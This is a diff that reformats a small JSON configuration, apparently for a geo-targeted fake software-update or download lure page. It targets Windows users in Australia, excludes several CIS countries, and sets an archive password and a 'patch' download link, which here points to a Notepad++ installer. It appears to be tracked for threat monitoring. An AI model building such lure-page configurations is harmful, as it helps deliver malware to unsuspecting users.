@@ -1,1 +1,36 @@
-{"PageStatus":"ON","Archiving":{"Enabled":"OFF","Password":"1231232","SoftwareName":"","ZIPName":""},"GEO":["AU"],"BlockedGEO":["AM","AZ","BY","KZ","KG","MD","RU","TJ","UZ"],"FileName":"","OS":["Windows"],"PatchDownloadLinks":["https:\/\/github.com\/notepad-plus-plus\/notepad-plus-plus\/releases\/download\/v8.1.4\/npp.8.1.4.Installer.x64.exe\n"],"Version":{"Enabled":"V3"},"AndroidLink":"","iOSLink":"","MacOSLink":""}
+{
+	"PageStatus": "ON",
+	"Archiving": {
+		"Enabled": "OFF",
+		"Password": "1231232",
+		"SoftwareName": "",
+		"ZIPName": ""
+	},
+	"GEO": [
+		"AU"
+	],
+	"BlockedGEO": [
+		"AM",
+		"AZ",
+		"BY",
+		"KZ",
+		"KG",
+		"MD",
+		"RU",
+		"TJ",
+		"UZ"
+	],
+	"FileName": "",
+	"OS": [
+		"Windows"
+	],
+	"PatchDownloadLinks": [
+		"https:\/\/github.com\/notepad-plus-plus\/notepad-plus-plus\/releases\/download\/v8.1.4\/npp.8.1.4.Installer.x64.exe\n"
+	],
+	"Version": {
+		"Enabled": "V3"
+	},
+	"AndroidLink": "",
+	"iOSLink": "",
+	"MacOSLink": ""
+}
